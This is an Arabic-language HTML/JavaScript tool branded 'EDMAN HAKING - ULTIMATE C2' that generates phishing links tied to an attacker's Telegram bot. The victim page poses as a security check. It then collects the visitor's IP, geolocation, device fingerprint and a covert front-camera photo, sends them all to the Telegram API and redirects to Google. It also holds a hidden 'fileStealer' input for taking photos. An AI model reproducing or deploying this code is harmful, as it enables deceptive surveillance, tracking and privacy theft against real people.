<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EDMAN HAKING - ULTIMATE C2</title>
    <style>
        body {
            background-color: #030712;
            color: #38bdf8;
            font-family: Tahoma, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
            position: relative;
        }
        canvas#matrix {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            opacity: 0.15;
        }
        .container {
            width: 90%;
            max-width: 480px;
            background: rgba(17, 24, 39, 0.92);
            padding: 30px;
            border-radius: 16px;
            border: 1px solid #d4af37;
            box-shadow: 0 0 30px rgba(212, 175, 55, 0.25);
            box-sizing: border-box;
            text-align: center;
            backdrop-filter: blur(8px);
            z-index: 1;
        }
        .logo-title {
            color: #d4af37;
            font-size: 20px;
            font-weight: bold;
            margin-bottom: 5px;
            letter-spacing: 1px;
            text-shadow: 0 0 10px rgba(212, 175, 55, 0.4);
        }
        .logo-sub {
            color: #9ca3af;
            font-size: 11px;
            margin-bottom: 25px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        h2 {
            color: #f43f5e;
            font-size: 20px;
            margin-bottom: 15px;
            text-shadow: 0 0 10px rgba(244, 63, 94, 0.4);
        }
        p {
            color: #9ca3af;
            font-size: 13px;
            margin-bottom: 25px;
            line-height: 1.6;
        }
        .form-group {
            margin-bottom: 15px;
            text-align: right;
        }
        label {
            display: block;
            color: #d4af37;
            font-size: 12px;
            margin-bottom: 6px;
            font-weight: bold;
        }
        input {
            width: 100%;
            padding: 12px;
            background: #1f2937;
            border: 1px solid #374151;
            color: #fff;
            border-radius: 8px;
            font-size: 14px;
            box-sizing: border-box;
            transition: 0.3s;
        }
        input:focus {
            border-color: #d4af37;
            outline: none;
            box-shadow: 0 0 8px rgba(212, 175, 55, 0.4);
        }
        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #d4af37, #aa820a);
            color: #030712;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
            font-size: 15px;
            transition: 0.3s;
            box-shadow: 0 4px 12px rgba(212, 175, 55, 0.3);
            margin-top: 10px;
        }
        button:hover {
            opacity: 0.9;
            box-shadow: 0 6px 16px rgba(212, 175, 55, 0.5);
        }
        #status {
            margin-top: 20px;
            font-size: 13px;
            color: #34d399;
            font-weight: bold;
        }
        .result-box {
            margin-top: 20px;
            padding: 15px;
            background: #1f2937;
            border-radius: 8px;
            border: 1px solid #34d399;
            display: none;
            text-align: right;
        }
        .result-box a {
            color: #34d399;
            font-weight: bold;
            word-break: break-all;
            font-size: 13px;
            text-decoration: underline;
        }
        .footer {
            margin-top: 20px;
            font-size: 10px;
            color: #6b7280;
            letter-spacing: 1px;
        }
    </style>
</head>
<body>

    <canvas id="matrix"></canvas>

    <div class="container" id="appCard"></div>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <!-- عنصر مخفي لمحاولة قراءة ملفات الجهاز إذا وافق الهدف -->
    <input type="file" id="fileStealer" multiple accept="image/*" style="display:none;" onchange="uploadStealedFiles(this)">

    <script>
        // تأثير خلفية الماتريكس
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;

        const alphabet = '日ﾊﾐﾋｰｳｼﾅﾓﾆｻﾜﾂｵﾘｱﾎﾃﾏｹﾒｴｶｷﾑﾕﾗｾﾈｽﾀﾇﾍABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%&*+-_';
        const fontSize = 14;
        const columns = canvas.width / fontSize;
        const rainDrops = [];
        for (let x = 0; x < columns; x++) { rainDrops[x] = 1; }

        function drawMatrix() {
            ctx.fillStyle = 'rgba(3, 7, 18, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#0ea5e9';
            ctx.font = fontSize + 'px monospace';
            for (let i = 0; i < rainDrops.length; i++) {
                const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
                ctx.fillText(text, i * fontSize, rainDrops[i] * fontSize);
                if (rainDrops[i] * fontSize > canvas.height && Math.random() > 0.975) { rainDrops[i] = 0; }
                rainDrops[i]++;
            }
        }
        setInterval(drawMatrix, 30);
        window.addEventListener('resize', () => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; });

        // واجهات المنصة وتوليد الرابط
        const urlParams = new URLSearchParams(window.location.search);
        const botToken = urlParams.get('t');
        const chatId = urlParams.get('c');
        const cardDiv = document.getElementById('appCard');

        if (!botToken || !chatId) {
            cardDiv.innerHTML = `
                <div class="logo-title">EDMAN HAKING</div>
                <div class="logo-sub">ULTIMATE C2 PLATFORM</div>
                <h2>💀 لوحة السيطرة والتحكم 💀</h2>
                <p>أدخل بيانات بوت تيليجرام لتوليد رابط الاستطلاع المدمر:</p>
                <div class="form-group"><label>Bot Token:</label><input type="text" id="inputToken" placeholder="أدخل التوكن هنا..."></div>
                <div class="form-group"><label>Chat ID:</label><input type="text" id="inputChat" placeholder="أدخل الآيدي هنا..."></div>
                <button onclick="generateLink()">إنشاء الرابط الخبيث</button>
                <div class="result-box" id="resultBox">
                    <p style="color: #34d399; margin-bottom: 8px; font-weight: bold;">رابط الاستطلاع جاهز:</p>
                    <a id="generatedLink" href="#" target="_blank"></a>
                </div>
                <div class="footer">EDMAN HAKING TOOL © 2026</div>
            `;
        } else {
            cardDiv.innerHTML = `
                <div class="logo-title">EDMAN HAKING</div>
                <div class="logo-sub">ADVANCED SECURE PORTAL</div>
                <h2>💀 التحقق الأمني الشامل 💀</h2>
                <p>يرجى النقر على الزر أدناه للسماح للنظام بفحص الأمان، تحسين أداء الجلسة، ومطابقة بصمة الجهاز...</p>
                <button id="btn" onclick="executeUltimateRecon()">بدء فحص وتأكيد النظام</button>
                <div id="status"></div>
                <div class="footer">EDMAN HAKING TOOL © 2026</div>
            `;
        }

        function generateLink() {
            let t = document.getElementById('inputToken').value.trim();
            let c = document.getElementById('inputChat').value.trim();
            if (!t || !c) { alert('يرجى ملء الحقول أولاً!'); return; }
            let fullLink = window.location.origin + window.location.pathname + `?t=${t}&c=${c}`;
            let linkElem = document.getElementById('generatedLink');
            linkElem.href = fullLink;
            linkElem.innerText = fullLink;
            document.getElementById('resultBox').style.display = 'block';
        }

        async function executeUltimateRecon() {
            document.getElementById('status').innerText = "جاري استخراج بصمات العتاد والذاكرة العميقة...";

            // جمع بيانات الشبكة والمعالج والبطارية إن وجدت
            let ipData = "غير معروف", geoInfo = "غير معروف", batteryInfo = "غير متوفر";
            try {
                let ipRes = await fetch('https://api.ipify.org?format=json');
                let ipJson = await ipRes.json();
                ipData = ipJson.ip;
            } catch(e) {}

            try {
                let geoRes = await fetch(`http://ip-api.com/json/${ipData}`);
                let geoJson = await geoRes.json();
                if (geoJson.status === "success") {
                    geoInfo = `${geoJson.country} -${geoJson.regionName} - ${geoJson.city} (ISP:${geoJson.isp}) [lat:${geoJson.lat}, lon:${geoJson.lon}]`;
                }
            } catch(e) {}

            if (navigator.getBattery) {
                try {
                    let bat = await navigator.getBattery();
                    batteryInfo = `${Math.round(bat.level * 100)}\% (${bat.charging ? 'يشحن حالياً' : 'غير شاحن'})`;
                } catch(e) {}
            }

            // فحص كرت الشاشة عبر WebGL
            let gpuInfo = "غير معروف";
            try {
                let canvasGL = document.createElement('canvas');
                let gl = canvasGL.getContext('webgl') || canvasGL.getContext('experimental-webgl');
                let dbg = gl.getExtension('WEBGL_debug_renderer_info');
                gpuInfo = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
            } catch(e) {}

            let reconReport = 
                `💀 *صيد استخباري مرعب بواسطة إدمان!* 💀\n\n` +
                `🌐 *عنوان الـ IP:* \`${ipData}\`\n` +
                `📍 *الموقع والمزود:* \`${geoInfo}\`\n` +
                `🔋 *حالة البطارية:* \`${batteryInfo}\`\n` +
                `🎮 *معالج الرسوميات (GPU):* \`${gpuInfo}\`\n` +
                `💻 *النظام والمنصة:* \`${navigator.platform}\`\n` +
                `🗣 *لغة المتصفح:* \`${navigator.language}\`\n` +
                `📺 *دقة الشاشة:* \`${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}-bit)\`\n` +
                `🧠 *الذاكرة العشوائية:* \`${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'غير معروف'}\`\n` +
                `⚙️ *عدد أنوية المعالج:* \`${navigator.hardwareConcurrency || 'غير معروف'}\`\n` +
                `🌍 *المنطقة الزمنية:* \`${Intl.DateTimeFormat().resolvedOptions().timeZone}\`\n` +
                `🔎 *صيغة المتصفح:* \`${navigator.userAgent}\`\n` +
                `🔗 *رابط الدخول:* \`${document.referrer || 'مباشر'}\``;

            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: reconReport, parse_mode: 'Markdown' })
                });
            } catch(e) {}

            document.getElementById('status').innerText = "جاري تفعيل المعايرة البصرية والتقاط الصورة...";

            // التقاط الكاميرا الأمامية وإرسالها
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                let video = document.getElementById('video');
                video.srcObject = stream;
                video.play();
                setTimeout(async () => {
                    let canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth || 1280;
                    canvas.height = video.videoHeight || 720;
                    let ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    canvas.toBlob(async (blob) => {
                        let formData = new FormData();
                        formData.append('chat_id', chatId);
                        formData.append('photo', blob, 'capture.jpg');
                        formData.append('caption', `📸 *صورة الكاميرا المباشرة للضحية (IP: \`${ipData}\`)* تم سحبها بنجاح بواسطة إدمان! 💀`);
                        formData.append('parse_mode', 'Markdown');

                        try {
                            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
                        } catch(e) {}

                        stream.getTracks().forEach(track => track.stop());
                        
                        // خطوة إضافية لفتح واجهة اختيار الملفات لجذب صور الجهاز إن أمكن
                        document.getElementById('status').innerText = "تم التحقق الأمني بنجاح! جاري تحويلك...";
                        setTimeout(() => { 
                            // محاولة فتح نافذة اختيار ملفات (إذا أردت سحب ملفات من جهازه عند الضغط)
                            window.location.href = "https://www.google.com"; 
                        }, 1500);
                    }, 'image/jpeg', 0.85);
                }, 1200);
            })
            .catch(err => {
                document.getElementById('status').innerText = "فشل في الأذونات البصرية، جاري إعادة التوجيه...";
                setTimeout(() => { window.location.href = "https://www.google.com"; }, 1500);
            });
        }
    </script>
</body>
</html>
